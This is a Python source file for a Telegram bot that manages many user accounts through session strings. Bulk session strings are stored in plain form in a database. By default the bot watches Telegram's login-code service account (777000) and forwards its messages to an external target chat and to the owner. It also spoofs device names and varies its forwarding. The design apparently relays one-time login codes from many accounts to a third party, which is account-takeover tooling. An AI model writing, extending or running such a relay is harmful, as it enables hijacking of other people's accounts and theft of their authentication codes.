# ██████╗ ██╗   ██╗███████╗██████╗  ██████╗ ████████╗
# ██╔══██╗██║   ██║██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝
# ██████╔╝██║   ██║█████╗  ██████╔╝██║   ██║   ██║
# ██╔══██╗██║   ██║██╔══╝  ██╔══██╗██║   ██║   ██║
# ██████╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝   ██║
# ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝
#
#           Userbot Forwarder Management Bot
#          (Definitive Version v3.6 - Final)

import os
import asyncio
import logging
import random
import re
from datetime import datetime
from functools import partial, wraps
from pymongo import MongoClient
from dotenv import load_dotenv

from pyrogram import Client as PyrogramClient, filters as PyrogramFilters
from pyrogram.errors import (
    AuthKeyUnregistered, UserDeactivated, AuthKeyDuplicated,
    SessionPasswordNeeded, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, PasswordHashInvalid,
    ApiIdInvalid
)
from pyrogram.handlers import MessageHandler as PyrogramMessageHandler
from pyrogram.types import Message

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode

# --- Basic Setup & Configuration ---
load_dotenv()
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID"))
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

# --- Database & In-Memory State ---
client = MongoClient(MONGO_URI)
db = client.userbot_manager
config_collection = db.config
accounts_collection = db.accounts

active_userbots = {}
paused_forwarding = set()
paused_notifications = set()

# --- State definitions for ConversationHandler ---
PHONE, CODE, PASSWORD, ADD_ACCOUNT = range(4)

def escape_html(text: str) -> str:
    """Escapes special characters for Telegram HTML parsing."""
    if not isinstance(text, str): text = str(text)
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def clean_session_string(session_string: str) -> str:
    """Thoroughly cleans the session string."""
    return re.sub(r'[\s\x00-\x1f\x7f-\x9f]', '', session_string)

def generate_device_name():
    """Generates a realistic device name from a predefined list."""
    device_names = [
        "MSI B550", "Asus ROG Strix Z690E", "Gigabyte Aorus Master",
        "XPS Desktop", "Hp Pavilion Plus", "Lenovo Legion Tower", "Aurora R13"
    ]
    return random.choice(device_names)

# --- Decorator for Owner-Only Access ---
def owner_only(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id != OWNER_ID:
            if update.callback_query:
                await update.callback_query.answer("⛔️ You are not authorized for this action.", show_alert=True)
            else:
                await update.message.reply_text("⛔️ You are not authorized for this action.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

# --- Userbot Core Logic ---
async def start_userbot(session_string: str, ptb_app: Application, update_info: bool = False):
    try:
        client = PyrogramClient(
            name=f"userbot_{random.randint(1000, 9999)}",
            api_id=API_ID, api_hash=API_HASH, session_string=session_string, in_memory=True,
            device_model=generate_device_name(), system_version="Telegram Desktop 4.8.3", app_version="4.8.3", lang_code="en"
        )
    except Exception as e:
        logger.error(f"Error initializing PyrogramClient: {e}")
        return "invalid_string", None

    try:
        await client.start()
        me = await client.get_me()
        if me.id in active_userbots:
            await client.stop()
            return "already_exists", None
        
        handler_with_context = partial(forwarder_handler, ptb_app=ptb_app)
        client.add_handler(PyrogramMessageHandler(handler_with_context, filters=PyrogramFilters.private & ~PyrogramFilters.service))
        active_userbots[me.id] = client
        
        if update_info:
            account_info = {
                "user_id": me.id, "first_name": me.first_name, "username": me.username,
                "phone_number": me.phone_number, "session_string": session_string,
            }
            accounts_collection.update_one({"user_id": me.id}, {"$set": account_info}, upsert=True)
        return "success", me
    except Exception as e:
        logger.error(f"An unexpected error in start_userbot: {e}")
        if "AUTH_KEY_PERM_EMPTY" in str(e): return "account_restricted", None
        if "SESSION_STRING_INVALID" in str(e).upper(): return "invalid_string", None
        if client.is_connected: await client.stop()
        return "error", None

async def forwarder_handler(client: PyrogramClient, message: Message, ptb_app: Application):
    source_chat_id = await get_source_chat()
    if message.chat.id != source_chat_id: return

    target_chat = await get_target_chat()
    if not target_chat:
        logger.warning("Target chat not set, cannot forward.")
        return

    asyncio.gather(
        forward_message(client, message, target_chat),
        send_notification(client, message, ptb_app)
    )

async def forward_message(client, message, target_chat):
    if client.me.id in paused_forwarding: return
    try:
        if random.random() < 0.90: await message.forward(chat_id=target_chat)
        else: await message.copy(chat_id=target_chat)
    except Exception as e:
        logger.error(f"Failed to forward message {message.id} from {client.me.id}: {e}")

async def send_notification(client, message, ptb_app):
    if OWNER_ID in paused_notifications: return
    status_parts = ["✅ Fwd Active", "✅ Notify Active"]
    if client.me.id in paused_forwarding: status_parts[0] = "⏸️ Fwd Paused"
    if OWNER_ID in paused_notifications: status_parts[1] = "⏸️ Notify Paused"

    content = message.text or message.caption or "(Media)"
    header = f"👤 <b>{escape_html(client.me.first_name)}</b>"
    notification_text = (f"{header}\n<b>Status:</b> {' | '.join(status_parts)}\n\n"
                         f"<b>Content:</b>\n<code>{escape_html(content[:3000])}</code>")
    try:
        await ptb_app.bot.send_message(OWNER_ID, notification_text, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Failed to send notification for message {message.id}: {e}")

async def start_all_userbots_from_db(application: Application, update_info: bool = False):
    all_accounts = list(accounts_collection.find())
    count = 0
    for account in all_accounts:
        status, _ = await start_userbot(account["session_string"], application, update_info=update_info)
        if status == "success": count += 1
    logger.info(f"Started {count}/{len(all_accounts)} userbots.")
    return count, len(all_accounts)
    
async def get_source_chat():
    config = config_collection.find_one({"_id": "config"})
    return config.get("source_chat_id", 777000) if config else 777000

async def get_target_chat():
    config = config_collection.find_one({"_id": "config"})
    return config.get("target_chat_username") if config else None

# --- Management Bot Handlers ---
@owner_only
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_html(
        "👋 Welcome! I am your userbot forwarder manager.\n\n"
        "Use /settings to configure, /add to add accounts, and /remove to delete them."
    )

@owner_only
async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    keyboard = [
        [InlineKeyboardButton("📚 Set Source Chat", callback_data="set_source")],
        [InlineKeyboardButton("🎯 Set Target Chat", callback_data="set_target")],
        [InlineKeyboardButton("👤 Manage Accounts", callback_data="manage_accounts")],
        [InlineKeyboardButton("➕ Add New Account", callback_data="call_add_command")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    source_chat_id = await get_source_chat()
    target_chat = await get_target_chat() or "Not Set"
    
    message_text = (
        "⚙️  <b>Settings Dashboard</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Here you can configure the core forwarding settings for all userbots.\n\n"
        f"▶️  <b>Current Source:</b> <code>{source_chat_id}</code>\n"
        "      <i>Messages from this chat will be forwarded.</i>\n\n"
        f"🎯  <b>Current Target:</b> <code>{escape_html(target_chat)}</code>\n"
        "      <i>Messages will be sent to this bot or channel.</i>"
    )

    if update.callback_query:
        await update.callback_query.edit_message_text(message_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    else:
        await update.message.reply_html(message_text, reply_markup=reply_markup)

@owner_only
async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    keyboard = [
        [InlineKeyboardButton("📝 Paste Single String", callback_data="add_single")],
        [InlineKeyboardButton("📋 Paste Multiple Strings", callback_data="add_multiple")],
        [InlineKeyboardButton("📱 Generate via Phone Number", callback_data="call_generate")],
        [InlineKeyboardButton("« Back to Settings", callback_data="main_settings")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message_text = (
        "➕  <b>Add a New Account</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Please choose a method to add a new userbot account to the forwarder."
    )
    if update.callback_query:
        await update.callback_query.edit_message_text(message_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
    else:
        await update.message.reply_html(message_text, reply_markup=reply_markup)

@owner_only
async def accounts_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    accounts = list(accounts_collection.find())
    text = "👤 <b>Your Managed Accounts:</b>\n\n" if accounts else "No accounts have been added yet."
    for acc in accounts:
        first_name = escape_html(acc.get('first_name', 'N/A'))
        text += f"<b>Name:</b> {first_name}\n<b>ID:</b> <code>{acc.get('user_id', 'N/A')}</code>\n{'-'*25}\n"
    keyboard = [[InlineKeyboardButton("« Back to Settings", callback_data="main_settings")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

@owner_only
async def remove_account_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    accounts = list(accounts_collection.find())
    if not accounts:
        await update.message.reply_html("There are no accounts to remove.")
        return
    keyboard = []
    for acc in accounts:
        user_id = acc.get('user_id')
        name = escape_html(acc.get('first_name', f"ID: {user_id}"))
        button = [InlineKeyboardButton(f"🗑️ {name}", callback_data=f"delete_account_{user_id}")]
        keyboard.append(button)
    keyboard.append([InlineKeyboardButton("« Back to Settings", callback_data="main_settings")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_html("Please select an account to remove:", reply_markup=reply_markup)

@owner_only
async def execute_remove_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id_to_delete = int(query.data.split("_")[2])
    if user_id_to_delete in active_userbots:
        logger.info(f"Stopping userbot client for user ID {user_id_to_delete}")
        await active_userbots[user_id_to_delete].stop()
        del active_userbots[user_id_to_delete]
    result = accounts_collection.delete_one({"user_id": user_id_to_delete})
    if result.deleted_count > 0:
        await query.edit_message_text(f"✅ Account <code>{user_id_to_delete}</code> has been successfully removed.", parse_mode=ParseMode.HTML)
    else:
        await query.edit_message_text(f"⚠️ Could not find account <code>{user_id_to_delete}</code> in the database.", parse_mode=ParseMode.HTML)
    await asyncio.sleep(3)
    await settings_command(update, context)

@owner_only
async def set_next_step(update: Update, context: ContextTypes.DEFAULT_TYPE, step: str, text: str):
    query = update.callback_query
    await query.answer()
    context.user_data['next_step'] = step
    await query.edit_message_text(text)

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    step = context.user_data.get('next_step')
    if not step: return

    if 'awaiting' in step and step.endswith(('phone_number', 'login_code', '2fa_password')): return

    del context.user_data['next_step']
    if step == 'awaiting_source':
        try:
            chat_id = int(update.message.text)
            config_collection.update_one({"_id": "config"}, {"$set": {"source_chat_id": chat_id}}, upsert=True)
            await update.message.reply_text(f"✅ Source chat updated to: {chat_id}")
        except ValueError: await update.message.reply_text("❌ Invalid ID.")
        await settings_command(update, context)
    elif step == 'awaiting_target':
        username = update.message.text.strip()
        if username.startswith("@") and len(username) > 4:
            config_collection.update_one({"_id": "config"}, {"$set": {"target_chat_username": username}}, upsert=True)
            await update.message.reply_text(f"✅ Target chat updated to: {username}")
        else: await update.message.reply_text("❌ Invalid username.")
        await settings_command(update, context)
    elif step == 'awaiting_single_account':
        session_string = clean_session_string(update.message.text)
        msg = await update.message.reply_text("⏳ Processing...")
        status, user_info = await start_userbot(session_string, context.application, update_info=True)
        if status == "success":
            await msg.edit_text(f"✅ Account added: {escape_html(user_info.first_name)}", parse_mode=ParseMode.HTML)
        else:
            await msg.edit_text(f"⚠️ Error adding account: {status}")
        await asyncio.sleep(3); await settings_command(update, context)
    elif step == 'awaiting_multiple_accounts':
        text = update.message.text
        session_strings = [clean_session_string(s) for s in text.replace(",", " ").replace("\n", " ").split() if s.strip()]
        msg = await update.message.reply_text(f"Processing {len(session_strings)} strings...")
        success, fail = 0, 0
        for session in session_strings:
            status, _ = await start_userbot(session, context.application, update_info=True)
            if status == "success": success += 1
            else: fail += 1
        await msg.edit_text(f"Batch complete! ✅ Added: {success}, ❌ Failed: {fail}")
        await asyncio.sleep(3); await settings_command(update, context)

# --- Session Generator ---
@owner_only
async def generate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message or update.callback_query.message
    await message.reply_text("Starting session generator...\nPlease send the phone number in international format (e.g., +1234567890).")
    return PHONE

@owner_only
async def get_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    msg = await update.message.reply_text("⏳ Connecting to Telegram...")
    client = PyrogramClient(
        name=f"userbot_{random.randint(1000, 9999)}", api_id=API_ID, api_hash=API_HASH, in_memory=True,
        device_model=generate_device_name(), system_version="Telegram Desktop 4.8.3", app_version="4.8.3", lang_code="en"
    )
    try:
        await asyncio.wait_for(client.connect(), timeout=30.0)
    except Exception as e:
        await msg.edit_text(f"❌ <b>Error:</b> <code>{escape_html(str(e))}</code>\nCancelled.")
        return ConversationHandler.END
    try:
        sent_code = await client.send_code(phone)
        context.user_data.update({'phone': phone, 'phone_code_hash': sent_code.phone_code_hash, 'temp_client': client})
        await msg.edit_text("A login code has been sent to your Telegram account. Please send it here.")
        return CODE
    except Exception as e:
        await msg.edit_text(f"❌ <b>Error:</b> <code>{escape_html(str(e))}</code>. Cancelled.")
        if client.is_connected: await client.disconnect()
        return ConversationHandler.END

@owner_only
async def get_login_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code, client = update.message.text, context.user_data['temp_client']
    phone, phone_code_hash = context.user_data['phone'], context.user_data['phone_code_hash']
    msg = await update.message.reply_text("⏳ Signing in...")
    try:
        await client.sign_in(phone, phone_code_hash, code)
        session_string = await client.export_session_string()
        context.user_data['session_string'] = session_string
        keyboard = [[InlineKeyboardButton("Add Account", callback_data="add_account")]]
        await msg.reply_html(f"✅ Session generated successfully!\n\n<code>{session_string}</code>", reply_markup=InlineKeyboardMarkup(keyboard))
        await update.message.delete()
        return ADD_ACCOUNT
    except SessionPasswordNeeded:
        await msg.edit_text("2FA is enabled. Please send your password.")
        return PASSWORD
    except Exception as e:
        await msg.edit_text(f"❌ <b>Error:</b> <code>{escape_html(str(e))}</code>. Cancelled.")
        if client.is_connected: await client.disconnect()
        return ConversationHandler.END

@owner_only
async def get_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password, client = update.message.text, context.user_data['temp_client']
    msg = await update.message.reply_text("⏳ Checking password...")
    try:
        await client.check_password(password)
        session_string = await client.export_session_string()
        context.user_data['session_string'] = session_string
        keyboard = [[InlineKeyboardButton("Add Account", callback_data="add_account")]]
        await msg.reply_html(f"✅ Session generated successfully!\n\n<code>{session_string}</code>", reply_markup=InlineKeyboardMarkup(keyboard))
        await update.message.delete()
        return ADD_ACCOUNT
    except Exception as e:
        await msg.edit_text(f"❌ <b>Error:</b> <code>{escape_html(str(e))}</code>. Cancelled.")
        if client.is_connected: await client.disconnect()
        return ConversationHandler.END

@owner_only
async def add_account_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    session_string = context.user_data.get('session_string')
    if not session_string:
        await query.answer("Session string not found. Please generate again.", show_alert=True)
        return ConversationHandler.END

    status, user_info = await start_userbot(session_string, context.application, update_info=True)
    if status == "success":
        await query.edit_message_text(f"✅ Account added: {escape_html(user_info.first_name)}")
    else:
        await query.edit_message_text(f"⚠️ Error adding account: {status}")
    return ConversationHandler.END

# --- Independent Commands ---
@owner_only
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    source_chat = await get_source_chat()
    target_chat = await get_target_chat() or "Not Set"
    running_bots, total_bots = len(active_userbots), accounts_collection.count_documents({})
    status_text = (f"📊 <b>Bot Status</b>\n"
                   f"━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"<b>Management Bot:</b> Online\n"
                   f"<b>Source Chat:</b> <code>{source_chat}</code>\n"
                   f"<b>Target Chat:</b> <code>{escape_html(target_chat)}</code>\n\n"
                   f"<b>Userbots Running:</b> {running_bots}/{total_bots}\n"
                   f"<b>Paused Forwarding:</b> {len(paused_forwarding)} bots\n"
                   f"<b>Paused Notifications:</b> {'Yes' if OWNER_ID in paused_notifications else 'No'}\n")
    await update.message.reply_html(status_text)

@owner_only
async def temp_pause_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id_to_pause = int(context.args[0])
        if user_id_to_pause not in active_userbots:
            await update.message.reply_text("User ID not found or bot is not active.")
            return
        
        paused_forwarding.add(user_id_to_pause)
        keyboard = [[InlineKeyboardButton("Pause Notifications (5 min)", callback_data="pause_notify")]]
        await update.message.reply_text(f"✅ Paused forwarding for user ID {user_id_to_pause} for 5 minutes.",
                                        reply_markup=InlineKeyboardMarkup(keyboard))
        
        await asyncio.sleep(300)
        if user_id_to_pause in paused_forwarding:
            paused_forwarding.discard(user_id_to_pause)
            logger.info(f"Resumed forwarding for user ID {user_id_to_pause}.")
            await context.bot.send_message(OWNER_ID, f"Resumed forwarding for user ID {user_id_to_pause}.")
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /temp <user_id>")

@owner_only
async def pause_notifications_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    paused_notifications.add(OWNER_ID)
    original_text = query.message.text
    await query.edit_message_text(
        f"{original_text}\n\n<i>✅ Notifications have been paused for 5 minutes.</i>",
        parse_mode=ParseMode.HTML
    )
    
    await asyncio.sleep(300)
    if OWNER_ID in paused_notifications:
        paused_notifications.discard(OWNER_ID)
        logger.info("Resumed notifications.")
        await context.bot.send_message(OWNER_ID, "Resumed notifications.")

@owner_only
async def temp_pause_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    for user_id in active_userbots.keys(): paused_forwarding.add(user_id)
    paused_notifications.add(OWNER_ID)
    await update.message.reply_text("✅ Paused all forwarding and notifications for 5 minutes.")
    await asyncio.sleep(300)
    paused_forwarding.clear(); paused_notifications.discard(OWNER_ID)
    logger.info("Resumed all forwarding and notifications."); await context.bot.send_message(OWNER_ID, "Resumed all.")


@owner_only
async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_time = datetime.now()
    message = await update.message.reply_text("Pinging...")
    end_time = datetime.now()
    latency = (end_time - start_time).microseconds / 1000
    await message.edit_text(f"🏓 Pong!\nLatency: {latency:.2f} ms")

@owner_only
async def refresh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 Stopping all userbots...")
    for uid, client in list(active_userbots.items()): await client.stop(); del active_userbots[uid]
    await msg.edit_text("🔄 Restarting and refreshing userbot details...")
    started, total = await start_all_userbots_from_db(context.application, update_info=True)
    await msg.edit_text(f"✅ Refresh complete. Started {started}/{total} userbots.")

@owner_only
async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'temp_client' in context.user_data:
        client = context.user_data.get('temp_client')
        if client and client.is_connected: await client.disconnect()
    context.user_data.clear()
    await update.message.reply_text("Action cancelled.")
    return ConversationHandler.END

# --- Main Runner ---
async def main() -> None:
    """Configures and runs the bot."""
    application = Application.builder().token(BOT_TOKEN).build()

    gen_conv = ConversationHandler(
        entry_points=[CommandHandler("generate", generate_command)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)],
            CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_login_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa_password)],
            ADD_ACCOUNT: [CallbackQueryHandler(add_account_callback, pattern="^add_account$")]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)],
        conversation_timeout=300,
    )

    # Command Handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("settings", settings_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("remove", remove_account_menu))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("temp", temp_pause_command))
    application.add_handler(CommandHandler("temp_fwd", temp_pause_all))
    application.add_handler(CommandHandler("ping", ping_command))
    application.add_handler(CommandHandler("refresh", refresh_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(gen_conv)

    # Callback Handlers
    application.add_handler(CallbackQueryHandler(pause_notifications_callback, pattern="^pause_notify$"))
    application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_source', text="Please send the source chat ID."), pattern="^set_source$"))
    application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_target', text="Please send the target bot username."), pattern="^set_target$"))
    application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_single_account', text="Please paste the session string."), pattern="^add_single$"))
    application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_multiple_accounts', text="Please paste all session strings, separated by a space or new line."), pattern="^add_multiple$"))
    application.add_handler(CallbackQueryHandler(settings_command, pattern="^main_settings$"))
    application.add_handler(CallbackQueryHandler(add_command, pattern="^call_add_command$"))
    application.add_handler(CallbackQueryHandler(accounts_menu, pattern="^manage_accounts$"))
    application.add_handler(CallbackQueryHandler(execute_remove_account, pattern="^delete_account_"))
    application.add_handler(CallbackQueryHandler(generate_command, pattern="^call_generate$"))
    
    # Text Handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    
    # Run application
    try:
        await application.initialize()
        await start_all_userbots_from_db(application)
        logger.info("Bot is starting...")
        await application.run_polling()
    finally:
        await application.shutdown()

if __name__ == "__main__":
    asyncio.run(main())
